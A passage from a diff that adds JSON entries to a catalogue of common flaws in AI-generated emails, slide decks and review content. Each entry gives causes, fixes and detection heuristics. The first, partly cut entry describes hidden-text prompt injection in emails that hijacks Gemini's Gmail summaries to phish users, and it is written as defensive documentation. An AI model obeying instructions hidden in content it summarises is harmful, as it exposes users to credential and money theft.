+  "why": "AI summary features read the full HTML, including text styled with zero font size or white colour, and models follow instructions found in content. A researcher disclosed this against Gemini in Gmail through Mozilla's 0DIN bug bounty, and Google added mitigations such as redacting suspicious links.",
+  "who": "Users trust the AI summary as a system message and can be phished for credentials or money through it.",
+  "theFix": "Summarisers should strip hidden and off-screen text before the model sees it and never present content from the email as a system alert. Teach users that a summary is not a security notice.",
+  "heur": "Scan inbound HTML for text with font-size:0, color matching the background, display:none or off-screen positioning that contains imperative phrases or phone numbers.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Google Gemini flaw hijacks email summaries for phishing",
+    "u": "https://bleepingcomputer.com/news/security/google-gemini-flaw-hijacks-email-summaries-for-phishing"
+   },
+   {
+    "t": "Beware! Research shows Gmail's AI email summaries can be hacked",
+    "u": "https://www.androidauthority.com/gemini-gmail-summaries-phishing-hack-3577547"
+   }
+  ],
+  "code": "B218",
+  "rel": [
+   "the-fake-reply-thread",
+   "no-plain-text-twin",
+   "the-burned-domain"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "no-plain-text-twin",
+  "name": "No Plain-Text Twin",
+  "track": "surface",
+  "group": "Accessibility",
+  "category": "Email",
+  "harm": "Accessibility",
+  "origin": "Model",
+  "oneLiner": "AI-generated email templates ship as HTML or images only, with no plain-text part and no alt text.",
+  "looksLike": "The message has no text/plain alternative. Key content, including the offer and the button, lives inside images with empty alt attributes. With images blocked, the reader sees blank boxes.",
+  "why": "Models generate the visible HTML they are asked for and rarely add a multipart plain-text version or meaningful alt text unless told. Outlook blocks images by default, screen readers cannot read text inside images, and filters look at the text-to-image balance.",
+  "who": "Screen reader users, people with images off and anyone on a strict filter get an empty or unreadable message, and deliverability suffers.",
+  "theFix": "Ask the tool for a plain-text version alongside the HTML and real alt text on every meaningful image. Keep the headline, offer and link as live HTML text, not inside an image.",
+  "heur": "Check the MIME parts for text/plain, and parse img tags for missing or empty alt; flag emails where visible text is under 100 words but images exceed three.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "AI-Generated Email Templates with React Email",
+    "u": "https://vp0.com/blogs/ai-generated-email-templates-react-email"
+   },
+   {
+    "t": "Why You Should Avoid Image-Only Emails",
+    "u": "https://support.envoke.com/en/articles/14626139-why-you-should-avoid-image-only-emails"
+   }
+  ],
+  "code": "A236",
+  "rel": [
+   "div-soup-email",
+   "invisible-instructions",
+   "permission-to-close-your-file"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "one-layout-deck",
+  "name": "One Layout Deck",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Slides",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "The AI deck repeats the same layout on every slide, often three equal boxes, regardless of content.",
+  "looksLike": "Slide after slide uses three evenly sized columns or cards with an icon and a short line each. A comparison, a timeline and a single key fact all get the same treatment. When one of the three points is the real message, it gets the same visual weight as the other two.",
+  "why": "AI slide tools ship a small set of layouts and pick the one that fits the generated outline, which is usually a short list. Reviewers found AI-generated layouts identical across prompts and Copilot slides following repetitive layouts with content structured to fill space.",
+  "who": "Audiences lose the hierarchy of the argument, and the deck looks like every other AI deck.",
+  "theFix": "Choose a layout per slide based on the message, and ask the tool to emphasise the one point that matters most. Allow single-statement slides.",
+  "heur": "Compare layout IDs or element structure across slides; flag decks where one layout is used on more than half the content slides.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Review: The best AI slide decks",
+    "u": "https://www.ignorance.ai/p/review-the-best-ai-slide-decks"
+   },
+   {
+    "t": "How to Make AI Slides That Don't Look AI-Generated (2026)",
+    "u": "https://www.chatslide.ai/guides/how-to-make-ai-slides-not-look-ai-generated"
+   },
+   {
+    "t": "Your AI Presentations Look Great but Say Nothing",
+    "u": "https://www.jeffsu.org/your-ai-presentations-look-great-but-say-nothing/"
+   }
+  ],
+  "code": "A237",
+  "rel": [
+   "bullets-of-equal-length",
+   "export-breaks-the-deck",
+   "the-handshake-slide"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "permission-to-close-your-file",
+  "name": "Permission To Close Your File",
+  "track": "behavioral",
+  "group": "Copy",
+  "category": "Email",
+  "harm": "Trust",
+  "origin": "Prompting",
+  "oneLiner": "An automated sequence ends with a guilt-tinged 'Should I close your file?' email to a stranger.",
+  "looksLike": "After three or four unanswered touches, a final email arrives titled 'Closing your file?' or 'Permission to close your file'. It implies an account, a case or a relationship that does not exist. Variants say 'Since I haven't heard back, I'll assume you're not interested.'",
+  "why": "Breakup emails are a standard last step in sales sequences, and AI prompt libraries now generate them on request with these exact subject lines. Because the sequence runs automatically, the breakup goes to everyone who stayed silent, including people who never asked to be contacted.",
+  "who": "Recipients are nudged by manufactured loss or guilt, and the sender's brand is tied to a passive-aggressive tone.",
+  "theFix": "End sequences without a breakup email, or send a plain final note that says you will stop writing and how to reach you. Never imply a file, account or prior agreement that does not exist.",
+  "heur": "Text match final sequence steps for /close (your|out) (file|account)|assume you'?re not interested|last chance/i.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Reviving & closing AI prompts",
+    "u": "https://hunter.io/prompts/follow-up/reviving-closing/"
+   },
+   {
+    "t": "5 Breakup Email Templates That Actually Work | Mixmax",
+    "u": "https://www.mixmax.com/blog/breakup-email-templates-that-get-replies"
+   }
+  ],
+  "code": "B219",
+  "rel": [
+   "hope-this-finds-you-well",
+   "the-raw-merge-tag",
+   "the-buried-ask"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "speaker-notes-that-echo",
+  "name": "Speaker Notes That Echo",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Slides",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "AI-generated speaker notes restate the slide's bullets word for word instead of adding what to say.",
+  "looksLike": "Open the notes pane and you find the same four bullets rewritten as sentences. There are no examples, transitions or numbers that are not already on the slide. A presenter reading them aloud just reads the slide.",
+  "why": "When asked for notes, models expand the visible slide text because it is the only context they have. Reviewers name notes that restate the slide bullet for bullet as a common AI deck mistake.",
+  "who": "Presenters are not helped, and audiences get the slide read to them.",
+  "theFix": "Give the tool your real talking points, examples and data, or write notes yourself; ask for notes that add what is not on the slide.",
+  "heur": "Compare notes text with slide text; flag slides where word overlap between notes and body exceeds 70%.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "12 Common Mistakes with AI-Generated Presentations (And How to Fix Each)",
+    "u": "https://2slides.com/blog/common-mistakes-ai-generated-presentations"
+   }
+  ],
+  "code": "A238",
+  "rel": [
+   "the-chart-that-doesn-t-add-up",
+   "topic-label-titles",
+   "bullets-of-equal-length"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "thank-you-questions",
+  "name": "Thank You, Questions?",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Slides",
+  "harm": "Productivity",
+  "origin": "Tool default",
+  "oneLiner": "The AI deck ends on a 'Thank You' or 'Questions?' slide with no next step, contact or decision.",
+  "looksLike": "The last slide is a large 'Thank You!' over a stock image or gradient. Sometimes a 'Key Takeaways' slide before it restates every title. Nothing tells the audience what to do or whom to contact.",
+  "why": "Deck generators follow a template with an opening and closing slide, and the closing slot defaults to thanks. Reviewers of AI decks list the closing slide with no next step or contact info as a common mistake.",
+  "who": "Audiences leave without a clear action, and the deck's final minute is wasted.",
+  "theFix": "Replace the closing slide with the one decision or action you want, a date and a named contact.",
+  "heur": "Check the last slide text; flag if it is only 'Thank you', 'Questions' or a summary list with no verb directed at the audience.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "12 Common Mistakes with AI-Generated Presentations (And How to Fix Each)",
+    "u": "https://2slides.com/blog/common-mistakes-ai-generated-presentations"
+   }
+  ],
+  "code": "A239",
+  "rel": [
+   "topic-label-titles",
+   "one-layout-deck",
+   "bullets-of-equal-length"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-buried-ask",
+  "name": "The Buried Ask",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Email",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "A two-line request becomes four polite paragraphs, with the actual ask in the third.",
+  "looksLike": "The email restates the context, thanks the reader, explains the sender's company, then finally asks for something near the end. Each paragraph is fluent and grammatically perfect. On a phone, the ask is below the fold.",
+  "why": "Models pad short replies into full, balanced paragraphs and favour a formal memo register. Guides on humanising AI email note short replies turned into 'four paragraphs of politeness' with the ask buried later on.",
+  "who": "Busy readers miss the request or give up, and the exchange takes more rounds than it should.",
+  "theFix": "Tell the tool to put the request in the first two sentences and keep work emails to one phone screen, roughly 120 words for cold outreach.",
+  "heur": "Count words and find the first question or request sentence; flag when the email exceeds 150 words or the first ask appears after the first paragraph.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Humanize AI Emails | Prompts for Emails That Sound Like You",
+    "u": "https://www.promptoptimizer.tools/prompts/humanize-ai-text/humanize-ai-emails"
+   },
+   {
+    "t": "Using AI to Write Cold Emails That Don’t Sound Like a Robot",
+    "u": "https://b2brocket.ai/blog-posts/ai-cold-emails-human-touch"
+   },
+   {
+    "t": "How to Recognize an Email Written by an AI Language Model (August 2024)",
+    "u": "https://rajiv.com/blog/2024/08/29/how-to-recognize-an-email-written-by-an-ai-language-model-august-2024/"
+   }
+  ],
+  "code": "A240",
+  "rel": [
+   "hope-this-finds-you-well",
+   "permission-to-close-your-file",
+   "the-fake-reply-thread"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-burned-domain",
+  "name": "The Burned Domain",
+  "track": "behavioral",
+  "group": "Safety",
+  "category": "Email",
+  "harm": "Trust",
+  "origin": "Business",
+  "oneLiner": "An AI SDR sends thousands of near-identical emails a day until the company's domain lands in spam for everyone.",
+  "looksLike": "Outbound volume jumps after an AI SDR rollout, reply rates fall below 1%, and complaint rates climb. Soon customer receipts, password resets and replies from real staff also start landing in junk. The team responds by buying more sending domains and warm-up services.",
+  "why": "AI cut the cost of a 'personalised' email to cents, so the business incentive is to send more. Mailbox providers now enforce complaint thresholds of 0.3% for bulk senders, and filters detect high-volume, low-variance template mail regardless of how personal each line looks.",
+  "who": "Recipients get flooded with unwanted mail, and the sending company damages delivery of its own transactional and customer email.",
+  "theFix": "Cap daily volume per mailbox, send only to verified and relevant contacts, include one-click unsubscribe, and pause sending when complaints approach 0.3%. Keep cold outreach on a separate domain from transactional mail.",
+  "heur": "Check sending logs and postmaster data for daily volume per mailbox, bounce rate above 2% and complaint rate above 0.1%; flag if transactional mail shares the outreach domain.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The AI SDR Backlash: Why More Volume Hurts Your Brand",
+    "u": "https://getboomerang.ai/post/ai-sdr-backlash"
+   },
+   {
+    "t": "Inbox Arms Race: Why Your AI Outreach Is Getting Ghosted",
+    "u": "https://www.baytechconsulting.com/blog/inbox-arms-race-why-your-ai-outreach-is-getting-ghosted.md"
+   },
+   {
+    "t": "Gmail and Yahoo’s bulk sending requirements for 2024",
+    "u": "https://www.resend.com/blog/gmail-and-yahoo-bulk-sending-requirements-for-2024"
+   }
+  ],
+  "code": "B220",
+  "rel": [
+   "invisible-instructions",
+   "hope-this-finds-you-well",
+   "the-sender-first-pitch"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-chart-that-doesn-t-add-up",
+  "name": "The Chart That Doesn't Add Up",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Slides",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "An AI-generated chart shows numbers that are unsourced, inconsistent or simply summed wrong.",
+  "looksLike": "A waterfall chart's bars do not add up to its total. A bar chart quotes a precise statistic with no source. An infographic's slices exceed 100% or its axis does not match its labels.",
+  "why": "Deck agents and image models produce charts to fill a data slot, often without real data or a check on the arithmetic. A study of 100 AI-generated infographics found 99 had at least one misleading element, including fabricated data and inconsistent encodings, and a review of a deck agent found it added the numbers wrong.",
+  "who": "Decision makers act on figures that are false, and anyone who checks stops trusting the deck.",
+  "theFix": "Build charts only from a data table you supply, show the source on the slide, and recalculate totals outside the tool before presenting.",
+  "heur": "Extract chart data and check sums and percentages; flag charts with no source note or with totals that differ from the sum of parts.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "When AI Lies with Charts: Misleading Infographics in Text-to-Image Generation",
+    "u": "https://pure.fh-ooe.at/en/publications/when-ai-lies-with-charts-misleading-infographics-in-text-to-image/"
+   },
+   {
+    "t": "Your AI Presentations Look Great but Say Nothing",
+    "u": "https://www.jeffsu.org/your-ai-presentations-look-great-but-say-nothing/"
+   },
+   {
+    "t": "12 Common Mistakes with AI-Generated Presentations (And How to Fix Each)",
+    "u": "https://2slides.com/blog/common-mistakes-ai-generated-presentations"
+   }
+  ],
+  "code": "A241",
+  "rel": [
+   "speaker-notes-that-echo",
+   "default-theme-deck",
+   "export-breaks-the-deck"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-dark-mode-white-box",
+  "name": "The Dark Mode White Box",
+  "track": "surface",
+  "group": "Colour & type",
+  "category": "Email",
+  "harm": "Accessibility",
+  "origin": "Tool default",
+  "oneLiner": "In dark mode the email's logo disappears, or the call-to-action sits in a glaring white rectangle.",
+  "looksLike": "A dark logo on a transparent PNG vanishes against an inverted dark background. A rounded button keeps a white box around it in Outlook dark mode and its text becomes hard to read. Body text flips to light but a hard-coded panel stays white.",
+  "why": "AI email generators and templates design for light mode only and hard-code colours. Email clients then invert some colours and not others, and they do not invert images. Testing of LLM-generated emails found a CTA button on an unsightly white box in Outlook 2021 dark mode.",
+  "who": "Recipients reading in dark mode, a large share of mobile users, cannot see the brand or read the button.",
+  "theFix": "Ask for a logo with a light outline or a separate dark-mode variant, avoid pure white panels behind buttons, and test in Apple Mail, Gmail app and Outlook dark mode.",
+  "heur": "Render the email in dark mode in at least three clients and check contrast of the logo and primary button; flag transparent PNG logos with dark-only artwork.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Assessing ChatGPT, Claude, and Gemini for HTML Email Creation",
+    "u": "https://knak.com/blog/testing-llms-html-email-creation/"
+   },
+   {
+    "t": "How to Enable Dark Mode in HTML Email – Everything You Need to Know",
+    "u": "https://www.freecodecamp.org/news/dark-mode-in-html-email-everything-you-need-to-know/"
+   },
+   {
+    "t": "How to Fix Broken Emails in Outlook, Gmail, and Dark Mode",
+    "u": "https://migma.ai/blog/how-to-fix-broken-emails-in-outlook-gmail-and-dark-mode"
+   }
+  ],
+  "code": "A242",
+  "rel": [
+   "invisible-instructions",
+   "half-dark-mode",
+   "div-soup-email"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-fake-reply-thread",
+  "name": "The Fake Reply Thread",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Email",
+  "harm": "Trust",
+  "origin": "Business",
+  "oneLiner": "A first email uses a 'Re:' subject or 'following up' line for a conversation that never happened.",
+  "looksLike": "The subject reads 'Re: your pending order' or 'Re: quick question' on the very first email. The body opens with 'Just following up on my last note' when there was no last note. The inbox makes it look like an existing thread.",
+  "why": "AI outreach tools optimise copy for open rate, and fake-reply and curiosity subjects lift opens in the short term. Generated sequences reuse these patterns across thousands of senders, so buyers now flag follow-ups to non-existent emails as a cold signal.",
+  "who": "Recipients are misled about their relationship with the sender, and in the US a subject line that does not reflect the content can breach CAN-SPAM.",
+  "theFix": "Never use Re: or Fwd: unless a real thread exists, and write a subject that says what the email is about. Measure replies and conversions, not opens.",
+  "heur": "Flag any first message in a sequence whose subject starts with Re: or Fwd:, or whose body says 'following up' or 'my last email' with no prior message.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Are these email subject lines deceptive, clever copywriting or bad data at work?",
+    "u": "https://martech.org/beyond-clickbait-avoid-deception-in-email-subject-lines/"
+   },
+   {
+    "t": "CAN-SPAM Act: A Compliance Guide for Business",
+    "u": "https://www.ftc.gov/business-guidance/resources/can-spam-act-compliance-guide-business"
+   },
+   {
+    "t": "The AI SDR Backlash: Why More Volume Hurts Your Brand",
+    "u": "https://getboomerang.ai/post/ai-sdr-backlash"
+   }
+  ],
+  "code": "A243",
+  "rel": [
+   "the-imagined-milestone",
+   "the-raw-merge-tag",
+   "invisible-instructions"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-handshake-slide",
+  "name": "The Handshake Slide",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Slides",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Every slide gets a stock or generated image of handshakes or abstract gradients, unrelated to the content.",
+  "looksLike": "A slide about invoice errors shows two people shaking hands. A slide about hiring shows a blue abstract wave. The image takes half the slide and pushes the text into a narrow column.",
+  "why": "AI deck generators add an image to most slides by default to look finished, picked by keyword from a stock library or generated from the title. Reviews note AI tools adding random stock photos and interchangeable imagery that distracts.",
+  "who": "Audiences spend attention on decoration, and the content gets less room.",
+  "theFix": "Turn off automatic images and add only pictures that show the actual product, data or people involved. An empty side is better than an unrelated photo.",
+  "heur": "Human review: for each image ask whether it shows something specific to the slide; flag decks where most images are generic stock or abstract art.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "How to Make AI Slides That Don't Look AI-Generated (2026)",
+    "u": "https://www.chatslide.ai/guides/how-to-make-ai-slides-not-look-ai-generated"
+   },
+   {
+    "t": "Common Mistakes When Using AI Presentation Makers and How to Avoid Them",
+    "u": "https://www.slidesai.io/blog/common-ai-presentation-mistakes"
+   },
+   {
+    "t": "Your AI Presentations Look Great but Say Nothing",
+    "u": "https://www.jeffsu.org/your-ai-presentations-look-great-but-say-nothing/"
+   }
+  ],
+  "code": "A244",
+  "rel": [
+   "icons-that-mean-nothing",
+   "one-layout-deck",
+   "topic-label-titles"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-imagined-milestone",
+  "name": "The Imagined Milestone",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Email",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "AI outreach congratulates you on a funding round, promotion or launch that never happened.",
+  "looksLike": "The first line reads 'Congrats on the Series B' to a bootstrapped company, or praises 'your recent initiative around growth'. The sender cites a product you do not sell or a post you did not write. The tone is warm and specific, but the fact is wrong.",
+  "why": "AI SDR agents are asked to write a personal first line for every lead, and when the enrichment data is thin or stale the model fills the gap with a plausible event. The output reads personal whether or not it is true, and nothing checks it before sending.",
+  "who": "Recipients see instantly that nobody looked at them, and a wrong claim about their business is worse than no personalisation at all.",
+  "theFix": "Only let the tool reference facts that come from a cited field with a date, and drop the personal line when no verified fact exists. Ask it to quote the source URL for every specific claim and review those before sending.",
+  "heur": "Human review: sample 20 generated first lines and check each named event against a public source; flag any line with no traceable source field.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "12 Red Flags in AI SDRs: How to Spot Low-Quality Outreach AI",
+    "u": "https://aisdr.com/blog/ai-sdr-red-flags.md"
+   },
+   {
+    "t": "AI SDR Hype vs. Reality: Why Autonomous Outreach Falls Short (and What Works Instead)",
+    "u": "https://accent-technologies.com/2026/06/20/ai-sdr-hype-vs-reality-why-autonomous-outreach-falls-short-and-what-works-instead/"
+   },
+   {
+    "t": "AI Outreach Tools Are Making Cold Email Worse: Here's the Warm Alternative",
+    "u": "https://getboomerang.ai/glossaries/listicle-ai-outreach-makes-cold-worse"
+   }
+  ],
+  "code": "A245",
+  "rel": [
+   "the-fake-reply-thread",
+   "hope-this-finds-you-well",
+   "permission-to-close-your-file"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-raw-merge-tag",
+  "name": "The Raw Merge Tag",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Email",
+  "harm": "Credibility",
+  "origin": "Tool default",
+  "oneLiner": "A cold or marketing email arrives reading 'Hi {first_name},' or 'Hi valued customer,' with the token unfilled.",
+  "looksLike": "The greeting shows the literal variable, a bracketed field like [FNAME], or a generic fallback such as 'friend'. Further down, an AI-written line references '{company}' or a blank where an enriched field should be. Sometimes a conditional block vanishes and leaves a gap mid-sentence.",
+  "why": "AI outreach tools build each email from a template plus model-written fields pulled from enrichment columns. When a column is empty or the tag syntax does not match the sending platform, nothing stops the send. Volume is high and nobody previews each message.",
+  "who": "Recipients learn at a glance that the message is automated, and the sender loses the one thing personalisation was meant to buy.",
+  "theFix": "Block sends where any field is empty or any tag survives rendering, and set explicit fallbacks with conditional logic. Preview a random sample of fully rendered emails before every batch.",
+  "heur": "Regex the rendered body and subject for /\\{\\{?\\s*\\w+\\s*\\}?\\}|\\[[A-Z_]{3,}\\]|%%\\w+%%/ and flag generic fallbacks like 'valued customer' in the greeting.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Repairing Broken Personalization Tags in Email Campaigns",
+    "u": "https://school.mumara.com/apps/repairing-broken-personalization-tags-in-email-campaigns/"
+   },
+   {
+    "t": "How to Personalize Cold Emails at Scale (Without Losing Your Mind)",
+    "u": "https://cotera.co/articles/ai-cold-email-personalization-at-scale"
+   }
+  ],
+  "code": "A246",
+  "rel": [
+   "the-sender-first-pitch",
+   "permission-to-close-your-file",
+   "the-fake-reply-thread"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-sender-first-pitch",
+  "name": "The Sender-First Pitch",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Email",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Cold emails lead with what 'we' do and 'our' platform before saying anything about the reader.",
+  "looksLike": "Sentences start 'At [Company], we...', 'Our solution empowers...', 'We help teams like yours...'. The reader's problem appears late, if at all, as a generic 'improve productivity'. Swap the recipient and the email still works.",
+  "why": "Models are given the sender's product description as context and little about the recipient, so they write about the material they have. Practitioner guides note that AI 'loves talking about the sender' and leans on 'we' in place of a personal voice.",
+  "who": "Recipients cannot see why the email is for them and delete it.",
+  "theFix": "Give the tool one concrete fact about the recipient's situation and tell it to open with that. Limit 'we' and 'our' to one sentence.",
+  "heur": "Count first-person plural pronouns per sentence in the first 60 words; flag when 'we', 'our' or 'us' outnumber 'you' and 'your'.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Using AI to Write Cold Emails That Don’t Sound Like a Robot",
+    "u": "https://b2brocket.ai/blog-posts/ai-cold-emails-human-touch"
+   },
+   {
+    "t": "How to Recognize an Email Written by an AI Language Model (August 2024)",
+    "u": "https://rajiv.com/blog/2024/08/29/how-to-recognize-an-email-written-by-an-ai-language-model-august-2024/"
+   },
+   {
+    "t": "How to Personalize Cold Emails at Scale (Without Losing Your Mind)",
+    "u": "https://cotera.co/articles/ai-cold-email-personalization-at-scale"
+   }
+  ],
+  "code": "A247",
+  "rel": [
+   "the-raw-merge-tag",
+   "hope-this-finds-you-well",
+   "permission-to-close-your-file"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "topic-label-titles",
+  "name": "Topic-Label Titles",
+  "track": "surface",
+  "group": "Copy",
+  "category": "Slides",
+  "harm": "Clarity",
+  "origin": "Tool default",
+  "oneLiner": "Every AI-generated slide is titled with a topic like 'Market Overview' instead of the point it makes.",
+  "looksLike": "Slide titles read 'Revenue Overview', 'Key Challenges', 'Our Solution', 'Next Steps'. The body is bullets under each label. The audience has to work out what the slide is saying.",
+  "why": "AI deck tools follow PowerPoint's default topic-and-bullets structure and generate titles from outline headings. Research by Garner and Alley found that sentence headlines with visual evidence improve comprehension and recall over topic-phrase titles.",
+  "who": "Audiences remember less, and decision makers skimming the deck cannot see the argument.",
+  "theFix": "Ask the tool to write each title as a full-sentence claim, such as 'Revenue grew 12% after the price change', and to make the slide body the evidence for it.",
+  "heur": "Check slide titles: flag decks where most titles have no verb or are under five words.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "How to Make AI Slides That Don't Look AI-Generated (2026)",
+    "u": "https://www.chatslide.ai/guides/how-to-make-ai-slides-not-look-ai-generated"
+   },
+   {
+    "t": "“Slide Titles … Scratch that … Use Sentence Headers for Clarity and Focus in Slide Design”",
+    "u": "https://procomm.ieee.org/slide-titles-scratch-that-use-sentence-headers-for-clarity-and-focus-in-slide-design/"
+   },
+   {
+    "t": "In PowerPoint, It’s the Headline that Makes the Difference",
+    "u": "https://ctl.wustl.edu/?p=4745"
+   }
+  ],
+  "code": "A248",
+  "rel": [
+   "thank-you-questions",
+   "speaker-notes-that-echo",
+   "the-handshake-slide"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "twenty-slides-saying-little",
+  "name": "Twenty Slides Saying Little",
+  "track": "surface",
+  "group": "Layout",
+  "category": "Slides",
+  "harm": "Productivity",
+  "origin": "Tool default",
+  "oneLiner": "A topic that needs five slides becomes twenty, each with one thin idea.",
+  "looksLike": "There is an agenda slide, a section divider for every part, an overview, a 'why it matters', and a takeaways slide. Adjacent slides make the same point in different words. Two slides in a row try to do the same thing.",
+  "why": "AI deck tools expand a short prompt into a full outline with a default card count and fill every slot. Reviewers list too many slides, each saying very little, as a tell, and one review found two consecutive slides duplicating each other.",
+  "who": "Audiences sit through padding, and the real content is spread too thin to land.",
+  "theFix": "Set the slide count yourself, ask the tool to merge slides that share a point, and delete agenda and divider slides in short decks.",
+  "heur": "Count slides against distinct claims; flag decks over 12 slides where more than a third are agenda, divider, overview or takeaway slides.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "How to Make AI Slides That Don't Look AI-Generated (2026)",
+    "u": "https://www.chatslide.ai/guides/how-to-make-ai-slides-not-look-ai-generated"
+   },
+   {
+    "t": "Your AI Presentations Look Great but Say Nothing",
+    "u": "https://www.jeffsu.org/your-ai-presentations-look-great-but-say-nothing/"
+   }
+  ],
+  "code": "A249",
+  "rel": [
+   "bullets-of-equal-length",
+   "export-breaks-the-deck",
+   "icons-that-mean-nothing"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "best-of-never-touched",
+  "name": "Best Of, Never Touched",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Reviews",
+  "harm": "Money",
+  "origin": "Business",
+  "oneLiner": "A 'best products' review list with affiliate links and no sign anyone used the products.",
+  "looksLike": "A ranked list of the ten best gadgets, each with a stock photo, a spec summary, a pros and cons box and a 'Check price' button. There are no original photos, measurements or test notes. The text is simple and repetitive and could describe any brand.",
+  "why": "Affiliate commissions reward ranking for review searches, and generating listicles is cheap. A study of product review searches found most top results used affiliate marketing, with a trend toward simple, repetitive and possibly AI-generated text. Google asks reviewers to show evidence of first-hand use.",
+  "who": "Shoppers spend money based on rankings that reflect commission, not testing.",
+  "theFix": "Only publish reviews with your own photos, measurements and reasons for each ranking. Tell the AI tool to draft from your test notes, never from spec sheets.",
+  "heur": "Human review: check whether each product has original photos or test data, and whether every item links to the same affiliate network.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Is Google Getting Worse? A Longitudinal Investigation of SEO Spam in Search Engines",
+    "u": "https://downloads.webis.de/publications/papers/bevendorff_2024a.pdf"
+   },
+   {
+    "t": "How To Write Reviews",
+    "u": "https://developers.google.com/search/docs/specialty/ecommerce/write-high-quality-reviews"
+   }
+  ],
+  "code": "A250",
+  "rel": [
+   "write-my-review-button",
+   "summary-eats-the-source",
+   "it-depends-on-your-needs"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "books-under-your-name",
+  "name": "Books Under Your Name",
+  "track": "behavioral",
+  "group": "Provenance",
+  "category": "Retail",
+  "harm": "Trust",
+  "origin": "Business",
+  "oneLiner": "Generated books are listed for sale credited to a real, known author who never wrote them.",
+  "looksLike": "A store page and a reading-site profile suddenly show several new titles under a known author's name, on that author's usual topics, with generic keyword titles. The first pages read like chatbot answers to 'What would this author say about X'. The author has to fight to get them taken down.",
